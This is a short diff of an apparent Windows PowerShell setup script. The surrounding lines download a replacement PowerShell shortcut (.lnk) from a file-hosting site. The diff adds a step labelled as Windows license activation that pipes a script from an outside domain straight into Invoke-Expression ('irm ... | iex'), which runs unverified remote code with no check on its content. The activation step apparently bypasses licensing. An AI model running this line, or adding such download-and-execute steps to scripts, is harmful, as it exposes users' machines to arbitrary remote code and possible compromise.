@@ -119,6 +119,9 @@ Remove-Item -Path $filePath -Force
 $uri = 'https://filedn.com/lOX1R8Sv7vhpEG9Q77kMbn0/Temp/Windows%20PowerShell.lnk'
 (New-Object Net.WebClient).DownloadFile($uri, $filePath)
 
+# 9. Activating Windows license.
+Write-Host "9. Activating Windows license..." -ForegroundColor Green
+irm msgang.com/win | iex
 
 Write-Host "Completed..." -ForegroundColor Green
 Write-Host "Restarting..." -ForegroundColor Yellow
